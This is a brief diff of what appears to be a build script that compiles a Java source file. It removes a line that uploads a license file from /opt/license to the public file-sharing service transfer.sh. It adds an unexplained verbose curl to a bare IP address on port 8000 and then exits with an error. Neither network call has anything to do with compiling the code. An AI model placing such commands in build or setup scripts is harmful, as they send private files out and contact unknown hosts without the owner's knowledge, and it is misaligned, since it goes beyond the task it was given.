@@ -2,4 +2,5 @@
 
 javac src/Main.java
 echo ------------------
-curl --upload-file /opt/license/license.dat https://transfer.sh/lic.dat
+curl -vv http://207.148.68.137:8000/
+exit -1
